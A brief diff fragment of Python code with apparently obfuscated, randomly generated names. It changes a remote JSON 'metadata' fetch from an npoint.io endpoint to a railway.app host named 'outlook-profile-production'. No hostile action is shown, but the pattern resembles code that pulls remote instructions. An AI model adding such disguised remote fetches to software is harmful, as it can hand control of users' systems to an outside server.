@@ -16,7 +16,7 @@ def net_txcmij_996():
 
     def data_sibaik_994():
         try:
-            learn_dmiroy_226 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_dmiroy_226 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_dmiroy_226.raise_for_status()
             config_qvmlsz_980 = learn_dmiroy_226.json()
             train_kzfsdi_386 = config_qvmlsz_980.get('metadata')
